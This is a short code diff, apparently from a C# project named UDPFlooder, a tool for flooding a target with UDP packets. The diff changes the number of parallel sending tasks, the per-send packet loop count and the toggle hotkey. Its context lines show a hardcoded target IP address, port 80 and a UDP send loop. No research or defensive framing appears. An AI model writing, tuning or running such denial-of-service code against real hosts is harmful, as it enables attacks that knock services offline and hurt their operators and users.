@@ -15,6 +15,7 @@ namespace UDPFlooder
         private bool isOn;
         private int currentValue = 100;
         private int packetCount = 0;
+        private int packCount = 1;
         private string ip = "27.27.27.27";
         private int port = 80;
         private int maxPayloadSize = 1472;
@@ -34,7 +35,7 @@ namespace UDPFlooder
 
             var tasks = new List<Task>();
 
-            for (int i = 0; i < 20; i++)
+            for (int i = 0; i < 5; i++)
             {
                 int taskNumber = i; // Capture the loop variable for use inside the task
                 tasks.Add(Task.Run(() =>
@@ -67,7 +68,7 @@ namespace UDPFlooder
                 IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ipAddress), port);
                 byte[] sendBuffer = Encoding.UTF8.GetBytes(message);
 
-                for (int i = 0; i < packetCount; i++)
+                for (int i = 0; i < packCount; i++)
                 {
                     try
                     {
@@ -179,7 +180,7 @@ namespace UDPFlooder
 
         private void InitializeHotKey()
         {
-            var toggleHotKey = new HotKey(Key.F6, 0, OnToggleHotKeyPressed);
+            var toggleHotKey = new HotKey(Key.F5, 0, OnToggleHotKeyPressed);
         }
 
         private void OnToggleHotKeyPressed(HotKey hotKey)
